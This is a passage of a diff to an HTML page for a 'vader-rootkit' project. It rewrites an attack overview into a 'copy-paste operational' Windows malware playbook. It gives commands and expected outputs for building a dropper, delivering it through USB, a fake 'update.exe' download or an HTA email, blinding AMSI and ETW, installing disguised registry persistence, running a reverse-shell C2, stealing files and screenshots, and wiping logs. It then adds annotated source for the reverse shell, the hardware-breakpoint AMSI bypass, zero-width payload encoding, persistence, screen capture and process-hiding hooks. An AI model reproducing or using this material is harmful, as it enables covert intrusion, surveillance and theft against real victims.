@@ -192,6 +192,52 @@ tr:hover td { background: rgba(0,255,65,0.02); }
 .evidence-card .value { color: var(--green); font-size: 1rem; font-weight: 700; }
 .evidence-card .note { color: var(--dim); font-size: 0.7rem; margin-top: 0.2rem; }
 
+/* PLAYBOOK COMMAND BLOCKS */
+.cmd-block {
+  background: #0d0d0d;
+  border: 1px solid #222;
+  border-left: 3px solid var(--green);
+  border-radius: 4px;
+  padding: 0.6rem 0.8rem;
+  margin: 0.5rem 0;
+  overflow-x: auto;
+  font-size: 0.72rem;
+  line-height: 1.5;
+  white-space: pre;
+  font-family: var(--mono);
+  color: var(--text);
+}
+.cmd-block .p { color: var(--green2); user-select: none; }
+.cmd-block .c { color: var(--dim); font-style: italic; }
+.cmd-block .o { color: var(--muted); }
+.verify { color: var(--amber); font-size: 0.72rem; margin-top: 0.3rem; font-style: italic; }
+.or-divider { color: var(--dim); font-size: 0.72rem; margin: 0.4rem 0; letter-spacing: 0.1em; }
+
+/* BUILD TUTORIAL */
+.code-annotated {
+  background: #0d0d0d;
+  border: 1px solid #222;
+  border-radius: 4px;
+  padding: 0.8rem 1rem;
+  margin: 0.5rem 0;
+  overflow-x: auto;
+  font-size: 0.72rem;
+  line-height: 1.6;
+  white-space: pre;
+  font-family: var(--mono);
+  color: var(--text);
+}
+.anno { color: var(--amber); }
+.kw { color: var(--cyan); }
+.fn { color: var(--green2); }
+.str { color: var(--pink); }
+.cmt { color: var(--dim); font-style: italic; }
+.build-step { counter-increment: build-step; }
+.build-step h3 { color: var(--green); font-size: 0.85rem; font-weight: 400; margin-bottom: 0.6rem; }
+.build-step h3::before { content: counter(build-step) ". "; color: var(--amber); }
+.section.build-section { counter-reset: build-step; }
+.build-note { background: rgba(255,176,0,0.06); border: 1px solid rgba(255,176,0,0.15); border-radius: 4px; padding: 0.5rem 0.8rem; font-size: 0.72rem; color: var(--amber); margin: 0.5rem 0; }
+
 /* FOOTER */
 footer { border-top: 1px solid #1a1a1a; padding: 2rem 0; text-align: center; color: var(--muted); font-size: 0.8rem; }
 footer a { color: var(--green3); text-decoration: none; }
@@ -242,9 +288,10 @@ footer a:hover { color: var(--green); }
   </table>
 </div>
 
-<!-- ═══════ KILL CHAIN ═══════ -->
+<!-- ═══════ PLAYBOOK — OPERATIONAL KILL CHAIN ═══════ -->
 <div class="section">
-  <h2>// KILL CHAIN &mdash; MAPPED TO TOOLS</h2>
+  <h2>// PLAYBOOK &mdash; OPERATIONAL KILL CHAIN</h2>
+  <p style="color:var(--muted);font-size:0.78rem;margin-bottom:1rem;">Every command you type. Every output you expect. Copy-paste operational.</p>
 
   <div class="killchain">
 
@@ -252,11 +299,18 @@ footer a:hover { color: var(--green); }
     <div class="phase recon">
       <div class="phase-header">
         <span class="phase-num">PHASE 1</span>
-        <span class="phase-title">RECON</span>
+        <span class="phase-title">RECON &mdash; MAP THE TARGET</span>
       </div>
       <div class="phase-body">
-        <div><span class="tool">vader_recon.ps1</span></div>
-        <div class="detail">Map Defender version, RTP status, exclusions, scheduled scans. Output: target profile for tailored payload generation.</div>
+        <div>Run recon scanner on the target machine to map Defender configuration:</div>
+        <div class="cmd-block"><span class="p">PS&gt;</span> powershell -ep bypass -File vader_recon.ps1
+<span class="o">[*] Windows Defender 4.18.26050.15
+[*] Real-Time Protection: ON
+[*] Tamper Protection: OFF
+[*] HVCI: ACTIVE
+[*] Exclusions: none
+[*] Scheduled scans: Quick scan daily 02:00</span></div>
+        <div class="verify">&#9888; Tamper Protection OFF = we can manipulate Defender. HVCI ON = no unsigned kernel drivers.</div>
       </div>
     </div>
     <div class="connector"></div>
@@ -265,12 +319,34 @@ footer a:hover { color: var(--green); }
     <div class="phase weapon">
       <div class="phase-header">
         <span class="phase-num">PHASE 2</span>
-        <span class="phase-title">WEAPONIZE</span>
+        <span class="phase-title">WEAPONIZE &mdash; BUILD THE PAYLOAD</span>
       </div>
       <div class="phase-body">
-        <div><span class="tool">ghost_encode.py --vader</span></div>
-        <div class="detail">Generate ghost-encoded VADER payload via zero-width Unicode steganography. Payload appears as blank file, renders as ??????? in PowerShell cat. Invisible to static analysis.</div>
-        <div style="margin-top:0.4rem;"><span class="tool">dark_room.exe</span> &mdash; secondary AMSI/ETW bypass layer for runtime protection.</div>
+        <div><b style="color:var(--amber);">OPTION A</b> &mdash; Single-click dropper (recommended):</div>
+        <div class="cmd-block"><span class="c"># On attacker machine — compile dropper with all layers baked in</span>
+<span class="p">$</span> cd vader-rootkit
+<span class="p">$</span> python cloak/build_cloak.py --scan
+
+<span class="o">  [+] Compiling cloak.dll            105 KB
+  [+] Compiling cloak_loader.exe     143 KB
+  [+] Compiling vader_dropper.exe    268 KB
+
+  [+] cloak.dll:         CLEAN
+  [+] cloak_loader.exe:  CLEAN
+  [+] vader_dropper.exe: CLEAN</span></div>
+        <div class="verify">&#9888; vader_dropper.exe is the full kill chain in one binary: AMSI bypass + cloak + persistence + C2 + screen capture.</div>
+
+        <div class="or-divider">&mdash; OR &mdash;</div>
+
+        <div><b style="color:var(--amber);">OPTION B</b> &mdash; Ghost-encoded PowerShell payload:</div>
+        <div class="cmd-block"><span class="c"># Generate invisible VADER payload with ghost steganography</span>
+<span class="p">$</span> cd ghost-encoder
+<span class="p">$</span> python ghost_encode.py --vader --ip 192.168.1.100 --port 53682
+
+<span class="o">[+] Generated VADER payload (persistence x3, screen capture, auto-reconnect)
+[+] Ghost encoded: 4,217 bytes → 8,434 zero-width Unicode chars
+[+] Written: vader_ghost.ps1
+[+] File appears BLANK in Notepad. Shows ??????? in PowerShell cat.</span></div>
       </div>
     </div>
     <div class="connector"></div>
@@ -279,16 +355,22 @@ footer a:hover { color: var(--green); }
     <div class="phase deliver">
       <div class="phase-header">
         <span class="phase-num">PHASE 3</span>
-        <span class="phase-title">DELIVER</span>
+        <span class="phase-title">DELIVER &mdash; GET IT ON TARGET</span>
       </div>
       <div class="phase-body">
-        <div>Four delivery vectors available:</div>
-        <ul>
-          <li><span class="tool">dropper.exe</span> &mdash; USB drop. C binary, runs ghost .ps1 hidden.</li>
-          <li><span class="tool">.hta wrapper</span> &mdash; Email. HTML Application, auto-executes PowerShell.</li>
-          <li><span class="tool">.lnk shortcut</span> &mdash; Disguised as PDF/document. Double-click triggers chain.</li>
-          <li><span class="tool">.bat wrapper</span> &mdash; Chains dark_room + ghost decode + iex.</li>
-        </ul>
+        <div>Choose delivery vector based on access:</div>
+        <div class="cmd-block"><span class="c"># USB drop — copy dropper to USB</span>
+<span class="p">$</span> copy cloak\bin\vader_dropper.exe E:\
+<span class="c"># Target plugs in USB, double-clicks vader_dropper.exe. Done.</span>
+
+<span class="c"># HTTP stager — serve payload remotely</span>
+<span class="p">$</span> python vader_serve.py --payload cloak\bin\vader_dropper.exe --port 8443
+<span class="o">[*] Serving vader_dropper.exe on https://0.0.0.0:8443/update.exe</span>
+<span class="c"># Social engineer target to download and run "update.exe"</span>
+
+<span class="c"># HTA email — for ghost-encoded payloads</span>
+<span class="p">$</span> python ghost_encode.py --hta --ip 192.168.1.100
+<span class="o">[+] Written: vader.hta (HTML Application — double-click executes)</span></div>
       </div>
     </div>
     <div class="connector"></div>
@@ -297,15 +379,30 @@ footer a:hover { color: var(--green); }
     <div class="phase exploit">
       <div class="phase-header">
         <span class="phase-num">PHASE 4</span>
-        <span class="phase-title">EXPLOIT</span>
+        <span class="phase-title">EXPLOIT &mdash; BLIND DEFENDER (AUTOMATIC)</span>
       </div>
       <div class="phase-body">
-        <div><span class="tool">dark_room.exe</span> blinds two critical defenses:</div>
-        <ul>
-          <li>AMSI &mdash; DR0 hardware breakpoint on <code style="color:var(--red);">AmsiScanBuffer</code></li>
-          <li>ETW &mdash; DR1 hardware breakpoint on <code style="color:var(--red);">EtwEventWrite</code></li>
-        </ul>
-        <div class="detail">Ghost .ps1 decodes invisible payload in memory via <code style="color:var(--amber);">iex</code>. No file written to disk.</div>
+        <div>vader_dropper.exe executes automatically on double-click. No user interaction needed:</div>
+        <div class="cmd-block"><span class="c"># AUTOMATIC — happens inside vader_dropper.exe</span>
+
+<span class="c"># Step 1: Sandbox check</span>
+<span class="o">  RAM &gt; 2GB?     ✓  (skip if VM with low RAM)
+  CPU cores &gt; 1? ✓  (skip if single-core sandbox)
+  Sleep real?    ✓  (skip if Sleep is accelerated)</span>
+
+<span class="c"># Step 2: Dark Room — AMSI bypass</span>
+<span class="o">  AddVectoredExceptionHandler → DarkRoomHandler
+  RaiseException(0x22D1) → sets DR0 on AmsiScanBuffer
+  Any AMSI scan → returns E_INVALIDARG (0x80070057)
+  AMSI is now BLIND.</span>
+
+<span class="c"># Step 3: Dark Room — ETW bypass</span>
+<span class="o">  DR1 set on EtwEventWrite
+  Any ETW event → returns 0 (silent success)
+  ETW telemetry is now BLIND.</span>
+
+<span class="c"># No memory modification. No patching. Hardware breakpoints only.</span>
+<span class="c"># MSRC acknowledged: VULN-195458 — "won't fix"</span></div>
       </div>
     </div>
     <div class="connector"></div>
@@ -314,15 +411,23 @@ footer a:hover { color: var(--green); }
     <div class="phase install">
       <div class="phase-header">
         <span class="phase-num">PHASE 5</span>
-        <span class="phase-title">INSTALL (PERSISTENCE x3)</span>
+        <span class="phase-title">INSTALL &mdash; PERSISTENCE (AUTOMATIC)</span>
       </div>
       <div class="phase-body">
-        <div>Three independent persistence mechanisms:</div>
-        <ul>
-          <li><code style="color:var(--green);">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> &rarr; SecurityHealthSystray</li>
-          <li>Startup folder &rarr; <code style="color:var(--green);">WindowsSecurityHealth.lnk</code></li>
-          <li>AppData ghost.ps1 copy &mdash; auto-reconnect on reboot</li>
-        </ul>
+        <div>Dropper installs persistence automatically. Survives reboot:</div>
+        <div class="cmd-block"><span class="c"># AUTOMATIC — happens inside vader_dropper.exe</span>
+
+<span class="c"># 1. Self-copy to AppData (blends with Windows files)</span>
+<span class="o">  COPY → %APPDATA%\Microsoft\Windows\svchost_update.exe</span>
+
+<span class="c"># 2. Registry Run key (executes on every login)</span>
+<span class="o">  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  Value: "SecurityHealthSystray" → path to svchost_update.exe</span>
+
+<span class="c"># Verify persistence (from C2 shell after connection):</span>
+<span class="p">C:\&gt;</span> reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SecurityHealthSystray
+<span class="o">  SecurityHealthSystray    REG_SZ    C:\Users\...\svchost_update.exe</span></div>
+        <div class="verify">&#9888; Machine reboots → svchost_update.exe runs on login → re-establishes C2. Shutdown survived.</div>
       </div>
     </div>
     <div class="connector"></div>
@@ -331,15 +436,24 @@ footer a:hover { color: var(--green); }
     <div class="phase c2">
       <div class="phase-header">
         <span class="phase-num">PHASE 6</span>
-        <span class="phase-title">C2</span>
+        <span class="phase-title">C2 &mdash; ESTABLISH COMMAND &amp; CONTROL</span>
       </div>
       <div class="phase-body">
-        <div><span class="tool">vader_listener.py</span> &mdash; reverse TCP shell</div>
-        <ul>
-          <li>Auto-reconnect with 5&ndash;30s jitter</li>
-          <li>Shell commands: full PowerShell access</li>
-          <li>Screen capture: GDI CopyFromScreen &rarr; JPEG &rarr; base64 over TCP</li>
-        </ul>
+        <div>Start listener on your machine BEFORE deploying dropper:</div>
+        <div class="cmd-block"><span class="c"># Start C2 listener on attacker machine</span>
+<span class="p">$</span> python cloak/c2_listen.py 53682
+
+<span class="o">[*] VADER C2 — listening on 0.0.0.0:53682
+[*] Waiting for connection...</span>
+
+<span class="c"># When dropper executes on target:</span>
+<span class="o">[+] Connection from 192.168.1.50:49812
+[+] Hostname: RADON-PC | Cloak: ACTIVE | Port: 53682
+
+C:\Users\target&gt;</span>
+
+<span class="c"># You now have a full interactive shell on the target.</span>
+<span class="c"># Auto-reconnect: if connection drops, dropper retries every 5 seconds.</span></div>
       </div>
     </div>
     <div class="connector"></div>
@@ -351,12 +465,30 @@ footer a:hover { color: var(--green); }
         <span class="phase-title">ACTIONS ON OBJECTIVE</span>
       </div>
       <div class="phase-body">
-        <ul>
-          <li>Screen surveillance (<code style="color:var(--amber);">screen</code> command)</li>
-          <li>File exfiltration (<code style="color:var(--amber);">type</code>/<code style="color:var(--amber);">copy</code> commands)</li>
-          <li>Credential harvesting (registry, browser stores)</li>
-          <li>Lateral movement (if network access available)</li>
-        </ul>
+        <div>Commands available in the C2 shell:</div>
+        <div class="cmd-block"><span class="c"># Screen capture — grab target's desktop</span>
+<span class="p">C:\&gt;</span> screenshot
+<span class="o">SCREENSHOT|1920|1080|6220800
+[binary BMP data — 5.9 MB raw, save with listener]</span>
+
+<span class="c"># File reconnaissance</span>
+<span class="p">C:\&gt;</span> dir C:\Users\target\Documents
+<span class="p">C:\&gt;</span> dir C:\Users\target\Desktop
+
+<span class="c"># Read files</span>
+<span class="p">C:\&gt;</span> type C:\Users\target\Documents\passwords.txt
+
+<span class="c"># System enumeration</span>
+<span class="p">C:\&gt;</span> systeminfo
+<span class="p">C:\&gt;</span> whoami /priv
+<span class="p">C:\&gt;</span> ipconfig /all
+<span class="p">C:\&gt;</span> netstat -ano
+
+<span class="c"># Navigate</span>
+<span class="p">C:\&gt;</span> cd C:\Users\target\Desktop
+
+<span class="c"># Disconnect cleanly</span>
+<span class="p">C:\&gt;</span> exit</div>
       </div>
     </div>
     <div class="connector"></div>
@@ -365,14 +497,28 @@ footer a:hover { color: var(--green); }
     <div class="phase cover">
       <div class="phase-header">
         <span class="phase-num">PHASE 8</span>
-        <span class="phase-title">COVER</span>
+        <span class="phase-title">COVER &mdash; CONCEALMENT &amp; CLEANUP</span>
       </div>
       <div class="phase-body">
-        <ul>
-          <li><span class="tool">vader_clean.exe</span> &mdash; 5-phase wipe + self-delete (anti-forensics)</li>
-          <li><span class="tool">cloak.dll</span> &mdash; hide process, files, connections from Task Manager / dir / netstat</li>
-          <li><span class="tool">mutate.py</span> &mdash; rotate XOR keys, recompile unique children (signature mutation)</li>
-        </ul>
+        <div>Cloak is already active (loaded by dropper). For cleanup after engagement:</div>
+        <div class="cmd-block"><span class="c"># Cloak is AUTOMATIC — loaded by dropper via CBT hook</span>
+<span class="c"># Task Manager: process hidden</span>
+<span class="c"># dir: files hidden</span>
+<span class="c"># netstat: C2 connection hidden</span>
+
+<span class="c"># Anti-forensics — run from C2 shell when done</span>
+<span class="p">C:\&gt;</span> vader_clean.exe
+<span class="o">[*] Phase 1: Wiping persistence artifacts
+[*] Phase 2: Clearing event logs
+[*] Phase 3: Removing dropped files
+[*] Phase 4: Scrubbing prefetch/shimcache
+[*] Phase 5: Self-delete
+[+] Clean.</span>
+
+<span class="c"># Mutate for next engagement (on attacker machine)</span>
+<span class="p">$</span> python mutate.py --rotate-keys
+<span class="o">[+] XOR keys rotated. Recompiling...
+[+] New signature: unique child binary</span></div>
       </div>
     </div>
 
@@ -445,10 +591,10 @@ footer a:hover { color: var(--green); }
       <td><span class="badge badge-clean">CLEAN</span></td>
     </tr>
     <tr>
-      <td style="color:var(--green);">dropper.exe</td>
+      <td style="color:var(--red);font-weight:700;">vader_dropper.exe</td>
       <td>vader-rootkit</td>
-      <td>USB delivery &mdash; silent ghost .ps1 execution</td>
-      <td><span class="badge badge-clean">CLEAN</span></td>
+      <td>Single-click kill chain &mdash; AMSI/ETW bypass + cloak + persistence + C2 + screen capture</td>
+      <td><span class="badge badge-clean">CLEAN</span> <span style="color:var(--amber);font-size:0.65rem;">268 KB</span></td>
     </tr>
     <tr>
       <td style="color:var(--amber);">cloak.dll</td>
@@ -615,6 +761,329 @@ footer a:hover { color: var(--green); }
       <div class="note">HWBP blind spot &mdash; acknowledged, won't fix</div>
     </div>
   </div>
+</div>
+
+<!-- ═══════ BUILD FROM SCRATCH ═══════ -->
+<div class="section build-section">
+  <h2>// BUILD FROM SCRATCH &mdash; ANNOTATED LINE BY LINE</h2>
+  <p style="color:var(--muted);font-size:0.78rem;margin-bottom:1.2rem;">From zero to working rootkit. Each layer builds on the last. Read in order.</p>
+
+  <!-- LAYER 1: REVERSE SHELL -->
+  <div class="build-step">
+    <h3>THE REVERSE SHELL &mdash; Foundation</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Every implant starts here. A TCP socket that connects back to you and pipes cmd.exe through it.</p>
+    <div class="code-annotated"><span class="cmt">// vader_dropper.c — the core pattern</span>
+
+<span class="anno">/* Create a raw TCP socket — WSASocket instead of socket()
+   to avoid Winsock's default overlapped I/O flag.
+   Dynamic import: not in the IAT, resolved at runtime via GetProcAddress. */</span>
+SOCKET s = <span class="fn">fn_WSASocket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+<span class="anno">/* Connect back to attacker's IP on our C2 port.
+   "Reverse" shell = target connects TO us. No inbound firewall issue. */</span>
+<span class="kw">struct</span> sockaddr_in addr;
+addr.sin_family      = AF_INET;
+addr.sin_port        = <span class="fn">htons</span>(53682);     <span class="anno">// C2 port</span>
+addr.sin_addr.s_addr = <span class="fn">inet_addr</span>(ip);   <span class="anno">// attacker IP</span>
+<span class="fn">fn_WSAConnect</span>(s, (<span class="kw">SOCKADDR</span> *)&amp;addr, <span class="kw">sizeof</span>(addr), ...);
+
+<span class="anno">/* Pipe cmd.exe stdin/stdout/stderr through the socket.
+   CreateProcess with hidden window — target sees nothing. */</span>
+STARTUPINFOA si;
+si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+si.wShowWindow = SW_HIDE;        <span class="anno">// invisible window</span>
+si.hStdInput  = NULL;            <span class="anno">// commands come from recv()</span>
+si.hStdOutput = hWritePipe;      <span class="anno">// output goes to send()</span>
+si.hStdError  = hWritePipe;
+<span class="fn">fn_CreateProcessA</span>(NULL, <span class="str">"cmd.exe /c ..."</span>, ...);
+
+<span class="anno">/* Read output from pipe, send to attacker over socket */</span>
+<span class="kw">while</span> (<span class="fn">ReadFile</span>(hReadPipe, buf, 4096, &amp;n, NULL) &amp;&amp; n > 0)
+    <span class="fn">send</span>(s, buf, n, 0);</div>
+    <div class="build-note">KEY CONCEPT: The shell is a loop. recv() gets commands, CreateProcess runs them, send() returns output. Auto-reconnect wraps this in an outer while(1) with Sleep(5000) between attempts.</div>
+  </div>
+
+  <!-- LAYER 2: AMSI BYPASS -->
+  <div class="build-step">
+    <h3>AMSI BYPASS &mdash; Hardware Breakpoints (Dark Room)</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Windows Defender scans every script via AMSI. We blind it using debug registers &mdash; no memory modification, no patching, invisible.</p>
+    <div class="code-annotated"><span class="cmt">// The hardware breakpoint technique — MSRC VULN-195458</span>
+
+<span class="anno">/* Step 1: Find AmsiScanBuffer's address in memory.
+   This is the function Defender calls to scan scripts. */</span>
+HMODULE hAmsi = <span class="fn">LoadLibraryA</span>(<span class="str">"amsi.dll"</span>);
+<span class="kw">void</span> *pAmsi = <span class="fn">GetProcAddress</span>(hAmsi, <span class="str">"AmsiScanBuffer"</span>);
+
+<span class="anno">/* Step 2: Install a Vectored Exception Handler.
+   This runs BEFORE any other exception handler in the process. */</span>
+<span class="fn">AddVectoredExceptionHandler</span>(1, DarkRoomHandler);
+
+<span class="anno">/* Step 3: Raise a custom exception to trigger DR register setup.
+   Inside the handler, we set DR0 = AmsiScanBuffer address.
+   DR7 enables the breakpoint (bits 0-1). */</span>
+<span class="fn">RaiseException</span>(0x22D1, 0, 0, NULL);
+
+<span class="anno">/* Inside DarkRoomHandler — when the custom exception fires: */</span>
+ctx->Dr0 = (<span class="kw">DWORD64</span>)pAmsi;   <span class="anno">// break on AmsiScanBuffer</span>
+ctx->Dr1 = (<span class="kw">DWORD64</span>)pEtw;    <span class="anno">// break on EtwEventWrite</span>
+ctx->Dr7 |= (1 &lt;&lt; 0);         <span class="anno">// enable DR0</span>
+ctx->Dr7 |= (1 &lt;&lt; 2);         <span class="anno">// enable DR1</span>
+
+<span class="anno">/* When AMSI calls AmsiScanBuffer — CPU hits DR0 breakpoint.
+   EXCEPTION_SINGLE_STEP fires. Our handler intercepts: */</span>
+<span class="kw">if</span> (ctx->Rip == pAmsi) {
+    ctx->Rax = 0x80070057;     <span class="anno">// return E_INVALIDARG</span>
+    ctx->Rip = *(DWORD64 *)ctx->Rsp;  <span class="anno">// skip the function, return to caller</span>
+    ctx->Rsp += 8;             <span class="anno">// clean the stack</span>
+}
+<span class="anno">/* AMSI thinks the scan failed. Script executes unscanned. */</span></div>
+    <div class="build-note">WHY THIS WORKS: Hardware breakpoints use CPU debug registers (DR0-DR3), not memory patches. No VirtualProtect, no WriteProcessMemory, no byte modification. Defender can't detect what isn't there. Same technique blinds ETW telemetry via DR1.</div>
+  </div>
+
+  <!-- LAYER 3: GHOST ENCODING -->
+  <div class="build-step">
+    <h3>GHOST ENCODING &mdash; Zero-Width Steganography</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Hide payloads in plain sight using invisible Unicode characters. File appears blank to human eyes and text editors.</p>
+    <div class="code-annotated"><span class="cmt"># ghost_encode.py — the steganographic alphabet</span>
+
+<span class="anno"># 16 zero-width Unicode characters represent hex digits 0-F.
+# These characters have zero visual width — they render as nothing.</span>
+GHOST_ALPHABET = {
+    <span class="str">'0'</span>: <span class="str">'​'</span>,  <span class="anno"># ZERO WIDTH SPACE</span>
+    <span class="str">'1'</span>: <span class="str">'‌'</span>,  <span class="anno"># ZERO WIDTH NON-JOINER</span>
+    <span class="str">'2'</span>: <span class="str">'‍'</span>,  <span class="anno"># ZERO WIDTH JOINER</span>
+    <span class="str">'3'</span>: <span class="str">'⁠'</span>,  <span class="anno"># WORD JOINER</span>
+    <span class="str">'4'</span>: <span class="str">'⁡'</span>,  <span class="anno"># FUNCTION APPLICATION</span>
+    <span class="str">'5'</span>: <span class="str">'⁢'</span>,  <span class="anno"># INVISIBLE TIMES</span>
+    <span class="str">'6'</span>: <span class="str">'⁣'</span>,  <span class="anno"># INVISIBLE SEPARATOR</span>
+    <span class="str">'7'</span>: <span class="str">'⁤'</span>,  <span class="anno"># INVISIBLE PLUS</span>
+    <span class="str">'8'</span>: <span class="str">'﻿'</span>,  <span class="anno"># BYTE ORDER MARK</span>
+    <span class="str">'9'</span>: <span class="str">'­'</span>,  <span class="anno"># SOFT HYPHEN</span>
+    <span class="str">'a'</span>: <span class="str">'͏'</span>,  <span class="anno"># COMBINING GRAPHEME JOINER</span>
+    <span class="str">'b'</span>: <span class="str">'؜'</span>,  <span class="anno"># ARABIC LETTER MARK</span>
+    <span class="str">'c'</span>: <span class="str">'ᅟ'</span>,  <span class="anno"># HANGUL CHOSEONG FILLER</span>
+    <span class="str">'d'</span>: <span class="str">'ᅠ'</span>,  <span class="anno"># HANGUL JUNGSEONG FILLER</span>
+    <span class="str">'e'</span>: <span class="str">'឴'</span>,  <span class="anno"># KHMER VOWEL INHERENT AQ</span>
+    <span class="str">'f'</span>: <span class="str">'᠎'</span>,  <span class="anno"># MONGOLIAN VOWEL SEPARATOR</span>
+}
+
+<span class="anno"># Encoding: each byte → 2-char hex → 2 invisible chars</span>
+<span class="kw">def</span> <span class="fn">ghost_encode</span>(data):
+    <span class="kw">return</span> <span class="str">''</span>.join(GHOST_ALPHABET[c] <span class="kw">for</span> byte <span class="kw">in</span> data
+                  <span class="kw">for</span> c <span class="kw">in</span> f<span class="str">'{byte:02x}'</span>)
+
+<span class="anno"># Decoding: 2 invisible chars → hex byte → original data</span>
+<span class="kw">def</span> <span class="fn">ghost_decode</span>(ghost_text):
+    reverse = {v: k <span class="kw">for</span> k, v <span class="kw">in</span> GHOST_ALPHABET.items()}
+    hex_str = <span class="str">''</span>.join(reverse[c] <span class="kw">for</span> c <span class="kw">in</span> ghost_text)
+    <span class="kw">return</span> bytes.fromhex(hex_str)</div>
+    <div class="build-note">PROTECTION LAYER: Ghost encoding hides payloads from STATIC analysis (AV scanning files on disk). It does NOT protect at runtime — that's Dark Room's job. Two-layer model: Ghost = file layer, Dark Room = runtime layer.</div>
+  </div>
+
+  <!-- LAYER 4: PERSISTENCE -->
+  <div class="build-step">
+    <h3>PERSISTENCE &mdash; Surviving Reboot</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Copy the dropper to a safe location and register it to run on every login.</p>
+    <div class="code-annotated"><span class="cmt">// vader_dropper.c — install_persistence()</span>
+
+<span class="anno">/* Get path of the running EXE */</span>
+<span class="kw">char</span> selfPath[MAX_PATH];
+<span class="fn">GetModuleFileNameA</span>(NULL, selfPath, MAX_PATH);
+
+<span class="anno">/* Build target path: %APPDATA%\Microsoft\Windows\svchost_update.exe
+   This directory always exists and blends with legitimate Windows files. */</span>
+<span class="fn">GetEnvironmentVariableA</span>(<span class="str">"APPDATA"</span>, appdata, MAX_PATH);
+<span class="fn">snprintf</span>(targetPath, MAX_PATH, <span class="str">"%s\\Microsoft\\Windows\\%s"</span>,
+         appdata, <span class="str">"svchost_update.exe"</span>);
+
+<span class="anno">/* Copy self to the target path (skip if already exists) */</span>
+<span class="kw">if</span> (<span class="fn">GetFileAttributesA</span>(targetPath) == INVALID_FILE_ATTRIBUTES)
+    <span class="fn">CopyFileA</span>(selfPath, targetPath, FALSE);
+
+<span class="anno">/* Write registry Run key — executes on every user login.
+   HKCU doesn't need admin privileges. */</span>
+<span class="fn">RegOpenKeyExA</span>(HKEY_CURRENT_USER,
+    <span class="str">"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"</span>,
+    0, KEY_SET_VALUE, &amp;hKey);
+<span class="fn">RegSetValueExA</span>(hKey, <span class="str">"SecurityHealthSystray"</span>, 0, REG_SZ,
+    (BYTE *)targetPath, strlen(targetPath) + 1);
+<span class="fn">RegCloseKey</span>(hKey);</div>
+    <div class="build-note">OPSEC: All strings (registry path, value name, filename) are XOR-encrypted in the binary with key 0xBE. Decoded at runtime, used, then zeroed with memset(). Never visible in a hex dump of the EXE.</div>
+  </div>
+
+  <!-- LAYER 5: SCREEN CAPTURE -->
+  <div class="build-step">
+    <h3>SCREEN CAPTURE &mdash; VNC-Style Remote View</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Capture the target's screen using GDI and send raw pixel data over the C2 socket.</p>
+    <div class="code-annotated"><span class="cmt">// vader_dropper.c — send_screenshot()</span>
+
+<span class="anno">/* Get a device context for the entire screen */</span>
+HDC hdcScreen = <span class="fn">GetDC</span>(NULL);              <span class="anno">// NULL = entire desktop</span>
+<span class="kw">int</span> w = <span class="fn">GetSystemMetrics</span>(SM_CXSCREEN);    <span class="anno">// screen width in pixels</span>
+<span class="kw">int</span> h = <span class="fn">GetSystemMetrics</span>(SM_CYSCREEN);    <span class="anno">// screen height</span>
+
+<span class="anno">/* Create a memory DC and bitmap to capture into */</span>
+HDC hdcMem = <span class="fn">CreateCompatibleDC</span>(hdcScreen);
+HBITMAP hBmp = <span class="fn">CreateCompatibleBitmap</span>(hdcScreen, w, h);
+<span class="fn">SelectObject</span>(hdcMem, hBmp);
+
+<span class="anno">/* BitBlt — copy screen pixels to our bitmap. SRCCOPY = straight copy. */</span>
+<span class="fn">BitBlt</span>(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
+
+<span class="anno">/* Extract raw 24-bit RGB pixels from the bitmap */</span>
+BITMAPINFOHEADER bi;
+bi.biWidth  = w;
+bi.biHeight = -h;          <span class="anno">// negative = top-down (normal orientation)</span>
+bi.biBitCount = 24;        <span class="anno">// 24-bit RGB — 3 bytes per pixel</span>
+<span class="fn">GetDIBits</span>(hdcMem, hBmp, 0, h, pixels, &amp;bi, DIB_RGB_COLORS);
+
+<span class="anno">/* Send header then raw pixel data over the C2 socket */</span>
+<span class="fn">snprintf</span>(hdr, 128, <span class="str">"SCREENSHOT|%d|%d|%d\n"</span>, w, h, dataSize);
+<span class="fn">send</span>(s, hdr, hdrLen, 0);   <span class="anno">// header tells listener dimensions</span>
+<span class="kw">while</span> (sent &lt; dataSize) {
+    <span class="fn">send</span>(s, pixels + sent, chunk, 0);  <span class="anno">// stream in 4KB chunks</span>
+}</div>
+    <div class="build-note">1920x1080 @ 24-bit = ~5.9 MB raw. The C2 listener receives the header, reads exactly dataSize bytes, and saves as BMP. For JPEG compression, use GDI+ (adds ~50 lines but reduces to ~200 KB).</div>
+  </div>
+
+  <!-- LAYER 6: CONCEALMENT -->
+  <div class="build-step">
+    <h3>CONCEALMENT &mdash; Inline Hooks (Cloak)</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">Hook NT functions to hide processes, files, and network connections from the OS itself.</p>
+    <div class="code-annotated"><span class="cmt">// hide_process.c — NtQuerySystemInformation hook</span>
+
+<span class="anno">/* NtQuerySystemInformation returns a linked list of SYSTEM_PROCESS_INFORMATION.
+   Each node has NextEntryOffset (0 = last) and ImageName (process name).
+   We walk the list and UNLINK nodes that match our hidden process names. */</span>
+
+<span class="anno">/* Original call via trampoline — get the real process list */</span>
+NTSTATUS status = trampoline_NtQuerySystemInformation(
+    SystemProcessInformation, buffer, length, returnLength);
+
+<span class="anno">/* Walk the linked list and remove our entries */</span>
+PSYSTEM_PROCESS_INFORMATION prev = NULL;
+PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)buffer;
+
+<span class="kw">while</span> (1) {
+    <span class="kw">if</span> (<span class="fn">should_hide</span>(curr->ImageName)) {
+        <span class="kw">if</span> (prev == NULL) {
+            <span class="anno">/* Hiding first entry — shift buffer forward */</span>
+            <span class="fn">memmove</span>(buffer, (BYTE*)curr + curr->NextEntryOffset, ...);
+        } <span class="kw">else</span> <span class="kw">if</span> (curr->NextEntryOffset == 0) {
